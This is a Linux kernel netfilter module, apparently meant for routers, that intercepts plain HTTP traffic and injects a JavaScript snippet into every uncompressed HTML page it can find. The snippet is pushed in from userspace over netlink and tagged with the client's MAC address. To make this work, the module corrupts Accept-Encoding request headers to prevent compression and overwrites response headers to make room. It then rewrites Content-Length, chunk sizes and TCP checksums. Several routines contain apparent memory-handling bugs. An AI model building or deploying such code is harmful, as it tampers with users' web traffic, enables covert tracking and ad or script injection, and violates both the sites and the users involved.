/*
LAST MODIFY: 2016-11-30
*/

#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/netfilter.h>
#include<linux/netfilter_ipv4.h>
#include<linux/tcp.h>
#include<linux/ip.h>
#include<linux/inet.h>
#include<linux/types.h>
#include<linux/string.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/hash.h>
#include <linux/ctype.h>
#include <linux/time.h>

#include<linux/netdevice.h>
#include<linux/netfilter_ipv4/ip_tables.h>
#include<net/arp.h>
#include<net/ip.h>
#include<net/route.h>
#include<net/netfilter/nf_nat.h>
#include<net/netfilter/nf_nat_core.h>

#define LOW_NETFILTER_VERSION
#ifndef LOW_NETFILTER_VERSION
#include<net/netfilter/nf_nat_l3proto.h>
#endif

#define NETLINK_USER 31

struct sock *nl_sk = NULL;

struct clients{
	unsigned int clientip;
	char clientmac[18];
};

#define clientnum 255

static struct nf_hook_ops nfho;
#define USERAGENT_SHORTEST_LEN 40
#define ACCEPT_HEADER_LEN 7
//Accept:*/*;q=0
#define ACCEPT_HEADER_ALL_LEN 14
//Accept-Encoding:*/*;q=0
#define ACCEPTENCODING_HEADER_ALL_LEN 23
char *accept_header = "Accept:*/*;q=0";
char *accept_header_prefix = "\r\nAccept:*/*;q=0";
char *accept_part_header = "*/*;q=0";

#define HTML_START_STR "html"
#define HTML_HEAD_STR "<head"
#define META_NAME_STR "<meta name="
#define META_STR "<meta"
#define NAME_STR "name="
#define SCRIPT_START_STR "<script"
#define SCRIPT_END_STR "</script>"
#define TITLE_STR "<title"
#define NOTE_START_STR "<!--"
#define NOTE_END_STR "-->"

char js_str[256]={0};
char js_cmdstr[256] = {0};

typedef struct{
	int num;
	char ch;
}strcut_insertTable;
strcut_insertTable l_insertTable[32];

unsigned int l_insertnum = 0;

unsigned int  js_enable=0;

#define JS_INJECT(header_str)	if(!js_inject_flag)\
{ret_value = move_js_inject(data, (header_str), js_str, head_position_fix, &head_position_tail, &real_head_tail,http_header_len);\
	if(ret_drop == ret_value)\
{return ret_drop;}\
else if(ret_success == ret_value)\
{js_inject_flag = 1;}}


#define JS_INJECT_REPEAT(header_str) if(!js_inject_flag)\
{do{\
	ret_value = move_js_inject(data, (header_str), js_str, head_position_fix, &head_position_tail,&real_head_tail,http_header_len);\
	if(ret_drop == ret_value){\
	return ret_drop;}\
else if(ret_success == ret_value){\
	js_inject_flag = 1;\
	break;}\
}while(ret_notfound != ret_value || ret_failure == ret_value);}

int ret_success = 0;
int ret_drop = -1;
int ret_notfound = 2;
int ret_failure = -2;

void replaceStr(char* strSrc, char* strFind, char* strReplace)
{
	while (*strSrc != '\0')
	{
		if (*strSrc == *strFind)
		{
			if (strncmp(strSrc, strFind, strlen(strFind)) == 0)
			{
				int i = strlen(strFind);
				char* q = strSrc+i;
				char* p = q;
				char* repl = strReplace;
				int lastLen = 0;
				char *pTemp, temp[512];
				int k;

				while (*q++ != '\0')
					lastLen++;
				for (k = 0; k < lastLen; k++)
				{
					*(temp+k) = *(p+k);
				}
				*(temp+lastLen) = '\0';
				while (*repl != '\0')
				{
					*strSrc++ = *repl++;
				}
				p = strSrc;
				pTemp = temp;
				while (*pTemp != '\0')
				{
					*p++ = *pTemp++;
				}
				*p = '\0';

				return;
			}
			else
				strSrc++;
		}
		else
			strSrc++;
	}
}

char* my_strcasestr(const char *s, const char *pattern)
{
	int length = strlen(pattern);

	while (*s) {
		if (strncasecmp(s, pattern, length) == 0)
			return (char *)s;
		s++;
	}
	return 0;
}


unsigned short tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
{
	int hlen = 0;
	int len = 0, count = 0;
	unsigned int sum = 0;
#if 1
	unsigned char odd[2] =
	{
		0, 0
	};
#endif
	unsigned short * ptr = NULL;
	hlen = (ip->ihl << 2);
	len = ntohs(ip->tot_len) - hlen;
	count = len;
	sum = 0;
	ptr = (unsigned short *)tcp;
	while (count > 1){
		sum += *ptr++;
		count -= 2;
	}
	if (count){
		odd[0] = *( unsigned char *) ptr;
		ptr = ( unsigned short *) odd;
		sum += *ptr;
	}

	/* Pseudo-header */
	ptr = (unsigned short *) &(ip->daddr);
	sum += *ptr++;
	sum += *ptr;
	ptr = (unsigned short *) &(ip->saddr);
	sum += *ptr++;
	sum += *ptr;
	sum += htons((unsigned short)len);
	sum += htons((unsigned short)ip->protocol);
#if 1
	/* Roll over carry bits */
	sum = ( sum >> 16) + ( sum & 0xffff);
	sum += ( sum >> 16);
	// Take one's complement
	sum = ~sum & 0xffff;
	return sum;
#else
	while(sum >> 16)
		sum = (sum >> 16) + (sum & 0xffff);
	return (unsigned short)(~sum);
#endif
}

char * strstr_len (const char *haystack,
	int       haystack_len,
	const char *needle)
{
	if (haystack_len < 0)
		return strstr (haystack, needle);
	else
	{
		const char *p = haystack;
		int needle_len = strlen (needle);
		const char *end;
		int i;

		if (needle_len == 0)
			return (char *)haystack;

		if (haystack_len < needle_len)
			return NULL;

		end = haystack + haystack_len - needle_len;

		while (*p && p <= end)
		{
			for (i = 0; i < needle_len; i++)
				if (p[i] != needle[i])
					goto next;

			return (char *)p;

next:
			p++;
		}

		return NULL;
	}
}

char* strstri_len(char * inBuffer, char * inSearchStr, int len)
{
	char*  currBuffPointer = inBuffer;
	while (*currBuffPointer != 0x00)
	{
		char* compareOne = currBuffPointer;
		char* compareTwo = inSearchStr;

		while (tolower((int)(*compareOne)) == tolower((int)(*compareTwo)))
		{
			compareOne++;
			compareTwo++;
			if (*compareTwo == 0x00)
			{
				return (char*) currBuffPointer;
			}
		}
		currBuffPointer++;
		len--;
		if(len<=0)
		{
			break;
		}
	}
	return NULL;
}

int locate_option_header_position(char *data, char *header_str, char **header_start, char **header_end, int data_len)
{
	*header_start = strstr_len(data, data_len,header_str);

	if(NULL != (*header_start))
	{
		if(((*header_start)-1)[0] != '\n')
		{
			return ret_notfound;
		}

		(*header_end) = strchr((*header_start)+strlen(header_str), '\r');
		if(NULL == (*header_end))
		{
			return ret_drop;
		}
	}
	else
	{
		return ret_notfound;
	}
	return ret_success;
}

int locate_must_header_position(char *data, char *header_str, char **header_start, char **header_end, int data_len)
{
	*header_start = strstr_len(data, data_len,header_str);
	if(NULL != (*header_start))
	{
		if(((*header_start)-1)[0] != '\n')
		{
			return ret_notfound;
		}
		(*header_end) = strchr((*header_start)+strlen(header_str), '\r');
		if(NULL == (*header_end))
		{
			return ret_drop;
		}
		else
		{
			return ret_success;
		}
	}

	return ret_drop;
}

/***********/
int move_js_inject(char *data, char *header_str, char *insert_str, char *position_fix, char **position_tail, char **real_head_tail, int data_len)
{
	char *str_start = NULL, *str_end = NULL;

	int header_len = 0, gap_len = 0;
	int insert_len = strlen(insert_str);

	int ret_value = locate_option_header_position(data, header_str,&str_start,&str_end, data_len);

	if(ret_success == ret_value)
	{
		if(str_end > position_fix)
		{
			return ret_drop;
		}

		header_len = (int)(str_end-str_start)+1;

		//overwrite, move memory
		memcpy(str_start,str_end+2,(((int)(*position_tail))-(int)str_end-2+1));
		(*position_tail) = (*position_tail)- header_len -2+1;
		(*real_head_tail) = (*real_head_tail)-header_len -2+1;

		//Calculate memory gap size
		gap_len = position_fix - (*position_tail);	    
		if(gap_len<=0)
		{
			return ret_drop;
		}

		if(gap_len>=insert_len)
		{
			(*position_tail)++;
			memcpy((*position_tail),insert_str,insert_len);
			//fill the memory gap
			(*position_tail) += insert_len;
			gap_len = position_fix-(*position_tail)+1;
			memset((*position_tail),' ',gap_len);
			return ret_success;
		}
		else
		{
			gap_len = position_fix-(*position_tail);
			memset((*position_tail)+1,' ',gap_len);
			return ret_failure;
		}
	}
	else if(ret_notfound == ret_value)
	{
		return ret_notfound;
	}
	else
	{
		return ret_drop;
	}
}

char *_itoa(char *buf, int size, int value, int radix)
{
	char    numBuf[32];
	char    *cp, *dp, *endp;
	char    digits[] = "0123456789abcdef";
	int     negative;

	if (radix != 10 && radix != 16) {
		return 0;
	}

	cp = &numBuf[sizeof(numBuf)];
	*--cp = '\0';

	if (value < 0) {
		negative = 1;
		value = -value;
		size--;
	} else {
		negative = 0;
	}

	do {
		*--cp = digits[value % radix];
		value /= radix;
	} while (value > 0);

	if (negative) {
		*--cp = '-';
	}

	dp = buf;
	endp = &buf[size];
	while (dp < endp && *cp) {
		*dp++ = *cp++;
	}
	*dp++ = '\0';
	return buf;
}

int reqheader_space(char *data, 
	char *header_str, 
	char *position_fix,
	int data_len)
{
	char *str_start = NULL, *str_end = NULL;
	int ret_value;
	
	ret_value = locate_option_header_position(data, header_str,&str_start,&str_end,data_len);
	if(ret_success == ret_value)
	{
		if(str_end > position_fix)
		{
			return 0;
		}

		return (int)(str_end-str_start)+1;
	}

	return 0;
}

int check_request_modify(char *data, 
	int data_len,
	int insert_len, 
	int useragent_str_len,
	char *request_header_tail)
{
	int sum;

	sum = 0;
	sum = sum+ reqheader_space(data, "TE:", request_header_tail, data_len);
	if(sum > insert_len)
		return ret_success;

	sum = sum+ reqheader_space(data, "Upgrade:", request_header_tail, data_len);
	if(sum > insert_len)
		return ret_success;

	sum = sum+ reqheader_space(data, "Accept-Encoding:", request_header_tail, data_len);
	if(sum > insert_len)
		return ret_success;

#if 1	
	if(sum + useragent_str_len-USERAGENT_SHORTEST_LEN >= insert_len )
		return ret_success;
#endif

	return ret_drop;
}

void moveSpace(char **pinserthead,
	char **pinserttail,
	char *psrc, 
	int srclen)
{
	int i;
	char *ptr1, *ptr2;

	if(*pinserttail < psrc)
	{
		ptr1 = psrc+srclen-1;
		ptr2 = psrc-1;
		for(i=psrc-*pinserttail; i>0; i--)
		{
			*ptr1 = *ptr2;
			ptr1--;
			ptr2--;
		}
		memset(*pinserttail, (int)" ", srclen);
		*pinserttail = *pinserttail + srclen;
	}
	else
	{
		ptr1 = psrc;
		ptr2 = psrc+srclen;
		for(i=0; i<*pinserttail-psrc-srclen; i++)
		{
			*ptr1 = *ptr2;
			ptr1++;
			ptr2++;
		}
		
		*pinserthead = *pinserthead - srclen;
		memset(*pinserttail- srclen, (int)" ", srclen);
	}
}

int header_injectJS(char *data,
	int data_len,
	char *header_str,
	char *insert_str, 
	char *position_tail,
	char **pinserthead,
	char **pinserttail,
	int *injectstatus)
{
	char *str_start = NULL, *str_end = NULL;

	int header_len = 0;
	int insert_len = strlen(insert_str);

	int ret_value = locate_option_header_position(data, header_str,&str_start,&str_end,data_len);
	if(ret_success == ret_value)
	{
		if(str_end > position_tail)
		{
			return ret_drop;
		}

		header_len = (int)(str_end-str_start)+2;

		moveSpace(pinserthead, pinserttail, str_start, header_len);
		if(*pinserttail - *pinserthead<insert_len) //overwrite, move memory
		{
			return ret_failure;
		}
		else if(1 == *injectstatus)
		{
			*injectstatus = 0;
			memcpy(*pinserthead,insert_str,insert_len);
			*pinserthead = *pinserthead + insert_len;
			return ret_success;
		}
	}

	return ret_failure;
}

void init_insertTable()
{
	l_insertTable[0].num = 1;
	l_insertTable[0].ch = 'o';
	l_insertTable[1].num = 1;
	l_insertTable[1].ch = 'e';

	l_insertTable[2].num = 2;
	l_insertTable[2].ch = 'o';
	l_insertTable[3].num = 2;
	l_insertTable[3].ch = 'e';

	l_insertTable[4].num = 3;
	l_insertTable[4].ch = 'c';
	l_insertTable[5].num = 3;
	l_insertTable[5].ch = 'o';

	l_insertTable[6].num = 9;
	l_insertTable[6].ch = 'o';
	l_insertTable[7].num = 9;
	l_insertTable[7].ch = 'e';

	l_insertTable[8].num = 10;
	l_insertTable[8].ch = 'e';
	l_insertTable[9].num = 10;
	l_insertTable[9].ch = 'c';

	l_insertTable[10].num = 12;
	l_insertTable[10].ch = 'l';

	l_insertnum = 0;
}

void insertTable(char *pdata)
{
    int pos;

	l_insertnum++;
    
	pos  =  l_insertnum%11;
	pdata[l_insertTable[pos].num] = l_insertTable[pos].ch;
}

int http_request_modify(struct iphdr *iph)
{
	struct tcphdr *tcp;
	char *data;
	int ip_hlen, tcp_len, tcp_hlen, data_len;

	char *str_start = NULL, *str_end = NULL, *accept_start = NULL;
	int accept_len = 0;
	int ret_value = ret_success;
	char *header_str = NULL;
	char *request_header_tail = NULL;
	char *char_p = NULL;
	int http_header_len = 0;

    tcp = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
    data = (char *)tcp + (tcp->doff << 2);
    ip_hlen = (iph->ihl << 2);
    tcp_len = ntohs(iph->tot_len) - ip_hlen;
    tcp_hlen = (tcp->doff << 2);
    data_len = tcp_len - tcp_hlen;

	if (NULL == data)
	{
		return ret_drop;
	}

	char_p = strstr_len(data,data_len/3,"GET ");
	if(!char_p)
	{
		return ret_drop;
	}
	else
	{
		data = char_p;
	}

	if(data_len <10)
	{
		return ret_drop;
	}


	request_header_tail = strstr_len(data+data_len/2,data_len,"\r\n\r\n")+4;
	if(NULL == request_header_tail)
	{
		return ret_drop;
	}

	http_header_len = (int)(request_header_tail-data);

	char_p = strchr(data, '\r');
	if(NULL == char_p || char_p > request_header_tail)
		return ret_drop;
	char_p -= 8;
	if(0 != memcmp(char_p, "HTTP/1.", 7))
	{
		return ret_drop;
	}

	if(('0' == char_p[7])||('1' == char_p[7]))
	{
		;//HTTP/1.0 or 1.1
	}
	else
	{
		return ret_drop;
	}

	/***********/
	char_p -= 5;
	if(char_p[1] == '.')
	{
		switch(char_p[2])
		{
		case 'j':
			if(char_p[3] == 's')
			{
				return ret_drop;
			}
			break;
		case 'r':
			if(char_p[3] == 'a')
			{
				return ret_drop;
			}
			break;
		case 'a':
			if(char_p[3] == 'i')
			{
				return ret_drop;
			}
			break;
		case 'p':
			if(char_p[3] == 'l')
			{
				return ret_drop;
			}
			else if(char_p[3] == 's')
			{
				return ret_drop;
			}
			else if(char_p[3] == 'm')
			{
				return ret_drop;
			}
			break;
		case '7':
			if(char_p[3] == 'z')
			{
				return ret_drop;
			}
			break;
		case 't':
			if(char_p[3] == 's')
			{
				return ret_drop;
			}
			else if(char_p[3] == 'k')
			{
				return ret_drop;
			}
			break;
		}
	}
	if(char_p[0] == '.')
	{
		if(char_p[1] == 'c')
		{
			if((char_p[2] == 's')&&(char_p[3] == 's'))
			{
				return ret_drop;	
			}
		}
		if(char_p[1] == 'g')
		{
			if((char_p[2] == 'i')&&(char_p[3] == 'f'))
			{
				return ret_drop;
			}
		}
		if(char_p[1] == 'p')
		{
			if((char_p[2] == 'n')&&(char_p[3] == 'g'))
			{
				return ret_drop;
			}
		}

		if(char_p[1] == 'j')
		{
			if((char_p[2] == 'p')&&(char_p[3] == 'g'))
			{
				return ret_drop;
			}
		}
	}

	header_str = "Accept-Encoding:";
	accept_start = strstr_len(data, http_header_len,header_str);
	if(!accept_start)
	{
		return ret_drop;
	}
	else
	{
		char_p = accept_start + strlen(header_str);
		str_end = strchr(char_p, '\r');
		if(NULL == str_end || str_end > request_header_tail)
		{
			return ret_drop;
		}
		else
		{
			insertTable(accept_start);
		}
	}

	tcp->check = 0;
	tcp->check = tcp_checksum(iph, tcp);

	return ret_success;
}


int macNumToStr(unsigned char *macAddr, char *str) 
{
   if ( macAddr == NULL ) 
		return -1;
   if ( str == NULL ) 
		return -1;

   sprintf(str, "%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x",
			(unsigned char ) macAddr[0], 
			(unsigned char ) macAddr[1], 
			(unsigned char ) macAddr[2],
			(unsigned char ) macAddr[3], 
			(unsigned char ) macAddr[4], 
			(unsigned char ) macAddr[5]);

   return 0;
}

int fill_js_with_clientmac(struct sk_buff *skb)
{
	char  macstr[12];
	unsigned char macaddr[6]={0};
	unsigned char *macheader=NULL;
	struct nf_conn *ct;
	enum ip_conntrack_info ctinfo;
	struct neighbour *neigh;
#ifdef LOW_NETFILTER_VERSION
	__be32 sip;
#endif /*LOW_NETFILTER_VERSION*/

	strcpy(js_str, js_cmdstr);

	ct=nf_ct_get(skb,&ctinfo);
	if(ct!=NULL)
	{
		struct net_device *dev=skb_dst(skb)->dev;
		enum ip_conntrack_dir dir=CTINFO2DIR(ctinfo);

#ifdef LOW_NETFILTER_VERSION
		neigh = __neigh_lookup(&arp_tbl, &sip, dev, 1);
#else
		neigh=__ipv4_neigh_lookup_noref(dev,ct->tuplehash[!dir].tuple.src.u3.ip);
#endif /*LOW_NETFILTER_VERSION*/
		if(unlikely(!neigh))
		{

		}
		else
		{
			memcpy(macaddr,neigh->ha,6);
#ifdef LOW_NETFILTER_VERSION
			neigh_release(neigh);
#endif /*LOW_NETFILTER_VERSION*/
		}
	}
	macNumToStr(macaddr, macstr);
	replaceStr(js_str, "%CLIENT-MAC-ADDR%", macstr );

#if 0
	macheader=skb_mac_header(skb);
	memcpy(macaddr,macheader,6);

	macNumToStr(macaddr, macstr);
	replaceStr(js_str, "%ROUTER-MAC-ADDR%", macstr);
#endif 

	return 1;
}

int http_response_modify(struct sk_buff *skb,struct iphdr *iph)
{
	struct tcphdr *tcp;
	char *data;
	char *char_p, *char_q = NULL;

	int str_len = 0;
	int ret_value = ret_success;
	int js_inject_flag = 0;
	int chunked_flag = 0;
	char *head_position_fix = NULL;
	char *head_position_tail = NULL;
	char *real_head_tail = NULL;
	char *response_header_tail = NULL;
	int http_header_len = 0;
	int ip_hlen, tcp_len, tcp_hlen, data_len;
	char *content_start_ptr = NULL, *content_end_ptr = NULL;

    tcp = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
    data = (char *)tcp + (tcp->doff << 2);
    ip_hlen = (iph->ihl << 2);
    tcp_len = ntohs(iph->tot_len) - ip_hlen;
    tcp_hlen = (tcp->doff << 2);
    data_len = tcp_len - tcp_hlen;

	if (NULL == data)
	{
		return ret_drop;
	}

	if(data_len<100)
	{
		return ret_drop;
	}

	if(0 != memcmp(data, "HTTP/1.", 7))
	{
		return ret_drop;
	}
	if(('0' == data[7])||('1' == data[7]))
	{
		;//HTTP/1.0 or 1.1
	}
	else
	{
		return ret_drop;
	}

	response_header_tail = strstr_len(data,data_len,"\r\n\r\n");
	if(NULL == response_header_tail)
	{
		return ret_drop;
	}

	http_header_len = (int)(response_header_tail-data);

	char_p = strchr(data, '\r');
	if(NULL == char_p)
		return ret_drop;


	str_len = (int)(char_p - data);
	if(strstr_len(data,  str_len,"200") || strstr_len(data,  str_len,"402")
		|| strstr_len(data, str_len,"404") || strstr_len(data,  str_len,"500"))
	{
		;//pass result code
	}
	else
	{
		return ret_drop;
	}

	char_p = strstr_len(data, http_header_len,"Content-Type:");
	if(NULL == char_p)
	{
		return ret_drop;
	}
	char_q = strchr(char_p, '\r');
	if(NULL == char_q)
	{
		return ret_drop;
	}
	str_len = (int)(char_q - char_p);

	if(!strstr_len(char_p,str_len,"text/html"))
	{
		return ret_drop;
	}

	char_p = strstr_len(data, http_header_len,"Content-Encoding:");
	if(char_p)
	{
		char_q = strchr(char_p, '\r');
		if(NULL == char_q)
		{
			return ret_drop;
		}
		str_len = (int)(char_q - char_p);

		if(strstr_len(char_p,str_len,"gzip") || strstr_len(char_p,str_len,"deflate"))
		{
			return ret_drop;
		}
	}
	if(strstr_len(data, http_header_len,"Via:Bright"))
	{
		return ret_drop;
	}

	char_p = strstri_len(data+http_header_len, HTML_START_STR,data_len-http_header_len);
	if(NULL != char_p)
	{
		head_position_tail = strstri_len(char_p, HTML_HEAD_STR,data_len-((int)(char_p-data)));
		if(NULL == head_position_tail)
		{
			return ret_drop;
		}
		else
		{
			char *head_position_tail_tmp = strchr(head_position_tail,'>'); // > of <head>
			if(NULL == head_position_tail_tmp)
			{
				return ret_drop;
			}

			if(head_position_tail_tmp-head_position_tail>20)
			{
			}
			head_position_tail = head_position_tail_tmp;

		}
	}
	else
	{
		return ret_drop;
	}

	head_position_fix = head_position_tail;
	real_head_tail = head_position_fix;

	if(strstr_len(data,http_header_len,"identity"))
	{
		return ret_drop;
	}

	if(strstr_len(data,http_header_len,"chunked"))
	{
		chunked_flag = 1;
	}

	fill_js_with_clientmac(skb);

	JS_INJECT("Server:");
	JS_INJECT("X-Cache:");
	JS_INJECT("X-Cache-Lookup:");
	JS_INJECT("X-Cache-Hits:");
	JS_INJECT("Via:");
	JS_INJECT("X-Via:");
	JS_INJECT("X-Cache-Lookup:");
	JS_INJECT("X-Cache-Hits:");
	JS_INJECT_REPEAT("X-");
	JS_INJECT("Etag:");
	JS_INJECT("Age:");
	JS_INJECT_REPEAT("Vary:");
	JS_INJECT("Accept-Ranges:");
	JS_INJECT("Connection:");
	JS_INJECT("Pragma:");
	JS_INJECT("Cache-Control:");
	JS_INJECT("Last-Modified:");

	if(ret_success ==  locate_option_header_position(data, "Content-Length:",&content_start_ptr,&content_end_ptr, http_header_len))
	{

		if(real_head_tail < head_position_fix)
		{
			content_start_ptr += 15;
			while(content_start_ptr[0]==' ')
			{
				content_start_ptr++;
			}
			content_end_ptr = strstr_len(content_start_ptr,8,"\r\n");
			if(NULL != content_end_ptr)
			{
				
                int content_replace_len;
                int content_size_len;
				char content_replace[8]={0};
				int move_len = head_position_fix - real_head_tail;
				int content_len = (int)simple_strtol(content_start_ptr,NULL,10);
				content_len += move_len;
				//sprintf(content_replace,"%d",content_len);
				_itoa(content_replace,8,content_len,10);
				content_replace_len = strlen(content_replace);
				content_size_len = content_end_ptr-content_start_ptr;
				if(content_replace_len == content_size_len)
				{
					memcpy(content_start_ptr,content_replace,content_size_len);

				}
				else if(content_replace_len<content_size_len)
				{
					memcpy(content_start_ptr+content_size_len-content_replace_len,content_replace,content_replace_len);

				}
				else
				{
					//more complicated
					if((content_replace_len-content_size_len) == 1)
					{
						content_start_ptr--;
						if(content_start_ptr[0]==' ')
						{
							memcpy(content_start_ptr,content_replace,content_size_len);

						}
						else
						{
							char *space_ptr = strstr_len(data,http_header_len,": ");
							if(space_ptr)
							{
								memcpy(space_ptr+1,space_ptr+2,content_start_ptr-space_ptr-2);
								content_start_ptr--;
								memcpy(content_start_ptr,content_replace,content_replace_len);

							}
							else
							{

							}
						}
					}
					else
					{

					}
				}
			}
			else
			{

			}

		}
		else if(real_head_tail > head_position_fix)
		{

		}
		else
		{

		}
	}
	else
	{

	}

	if(1 == chunked_flag)
	{
		if(real_head_tail < head_position_fix)
		{

            char * chunked_size_start;
            char * chunked_size_end;

			response_header_tail = response_header_tail -(head_position_fix-real_head_tail);
			chunked_size_start = response_header_tail+4;
			chunked_size_end = strstr_len(chunked_size_start,16,"\r\n");
			if(NULL != chunked_size_end)
			{
				/********/
				if(1==((int)(chunked_size_end-chunked_size_start)))
				{
					//PRINTF("!!!response chunk hit size 1.!!!\n");

					while(chunked_size_end[0] == '\r')
					{
						chunked_size_end+=2;
					}
					chunked_size_start = chunked_size_end;
					chunked_size_end = strstr_len(chunked_size_start,16,"\r\n");

					if(NULL == chunked_size_end)
					{
						//PRINTF("!!!response Error:chunk size no end!!!\n");
					}
				}
				/********/
				if(NULL != chunked_size_end) {

                    int move_len;
                    int chunked_size_len;
                    int chunk_size;
                    char chunk_replace[16]={0};
                    int chunk_replace_len;

					move_len = head_position_fix - real_head_tail;
					chunked_size_len = chunked_size_end-chunked_size_start;
					//char *chunked_tail;
					chunk_size = (int)simple_strtol(chunked_size_start,NULL,16);
					chunk_size += move_len;
					//sprintf(chunk_replace,"%x",chunk_size);
					_itoa(chunk_replace,16,chunk_size,16);
					chunk_replace_len = strlen(chunk_replace);
					if(chunk_replace_len == chunked_size_len)
					{
						memcpy(chunked_size_start,chunk_replace,chunked_size_len);

					}
					else if(chunk_replace_len<chunked_size_len)
					{
						memcpy(chunked_size_start+chunked_size_len-chunk_replace_len,chunk_replace,chunk_replace_len);

					}
					else
					{
						//more complicated
						if((chunk_replace_len-chunked_size_len) == 1)
						{
							char *space_ptr = strstr_len(data,http_header_len,": ");
							if(space_ptr)
							{
								memcpy(space_ptr+1,space_ptr+2,chunked_size_start-space_ptr-2);
								chunked_size_start--;
								memcpy(chunked_size_start,chunk_replace,chunk_replace_len);

							}
							else
							{

							}
						}
						else
						{

						}
					}
				}
			}
			else
			{

			}
		}
		else if(real_head_tail > head_position_fix)
		{

		}
		else
		{

		}
	}
	else
	{

	}

	tcp->check = 0;
	tcp->check = tcp_checksum(iph, tcp);

	if(js_inject_flag)
	{ 
		return 0;
	}
	else
	{
		return ret_drop;
	}
}


unsigned int hook_func(unsigned int hooknum,
struct sk_buff *skb,
	const struct net_device *in,
	const struct net_device *out,
	int (*okfn)(struct sk_buff*))
{
	struct iphdr* iph=ip_hdr(skb);
	struct tcphdr* tcph=NULL;
	unsigned short srcport,dstport,iplen;
	unsigned char *http_data=NULL;

	unsigned int ipheadlen=0;
	unsigned int tcpheadlen=0;
	unsigned short off;

	__u8 srcaddr[4]={0};
	__u8 dstaddr[4]={0};
	__be32 src=iph->saddr;
	__be32 dst=iph->daddr;

	memcpy(&srcaddr,&src,4);
	memcpy(&dstaddr,&dst,4);
	ipheadlen=iph->ihl*4;
	tcph=(struct tcphdr*)((unsigned char*)iph+ipheadlen);
	tcpheadlen=tcph->doff*4;
	srcport=ntohs(tcph->source);
	dstport=ntohs(tcph->dest);
	iplen=ntohs(iph->tot_len);
	off=iph->frag_off;

	if(js_enable==0)
	{
		return NF_ACCEPT;
	}


	if((srcaddr[0]==dstaddr[0])
		&&(srcaddr[1]==dstaddr[1]))
	{
		return NF_ACCEPT;
	}


	if(iph->protocol==6) 
	{  

#ifdef LOW_NETFILTER_VERSION
		if(iph->frag_off & 0x4)
		{
			return NF_ACCEPT;
		}
#else
		if(skb_has_frag_list(skb))
		{
			return NF_ACCEPT;
		}
#endif /*LOW_NETFILTER_VERSION*/


		if((dstport==80)||(srcport==80))
		{
			if(iplen>(ipheadlen+tcpheadlen))/*iplen==ipheadlen+tcpheadlen: tcp ACK/SYS/FIN packets: ignore */
			{
				http_data=(unsigned char*)tcph+tcpheadlen;
				if(dstport==80)
				{
					http_request_modify(iph);
				}
				if(srcport==80)
				{
					http_response_modify(skb,iph);
				}
			}
		}
	}
	return NF_ACCEPT;
}



static void cap_receive(struct sk_buff *skb)
{

	struct nlmsghdr *nlh;
	int pid;
	int msg_type=0;
	int msg_size;
	char *msg = "Hello from kernel";
	char *buffer=NULL;
	printk(KERN_INFO "Entering: %s\n", __FUNCTION__);

	msg_size = strlen(msg);

	nlh = (struct nlmsghdr *)skb->data;
	printk(KERN_INFO "Netlink received msg payload:%s\n", (char *)nlmsg_data(nlh));
	pid = nlh->nlmsg_pid; /*pid of sending process */

	msg_type=nlh->nlmsg_type;

	buffer=nlmsg_data(nlh);

	//js_enable=buffer[0];
	memcpy(&js_enable,buffer,4);
	memset(js_cmdstr,0,sizeof(js_cmdstr)); 
	strcpy(js_cmdstr,buffer+4);
}


int init_module()
{
#ifndef LOW_NETFILTER_VERSION
	struct netlink_kernel_cfg cfg = {
        .input = cap_receive,
    }; 
#endif /*LOW_NETFILTER_VERSION*/

	init_insertTable();

	nfho.hook=hook_func;
	nfho.hooknum=NF_INET_POST_ROUTING;
	nfho.pf=PF_INET;
	nfho.priority=NF_IP_PRI_FIRST;
	nf_register_hook(&nfho);

#ifdef LOW_NETFILTER_VERSION
	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, cap_receive,
		NULL, THIS_MODULE);
#else
	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
#endif

	if (!nl_sk)
	{
		printk("Error creating socket.\n");
		return -2;
	}
	else
	{
		printk("creat nlsock ok!");
	}

	return 0;
}

void cleanup_module()
{
	netlink_kernel_release(nl_sk);
	nf_unregister_hook(&nfho);
}
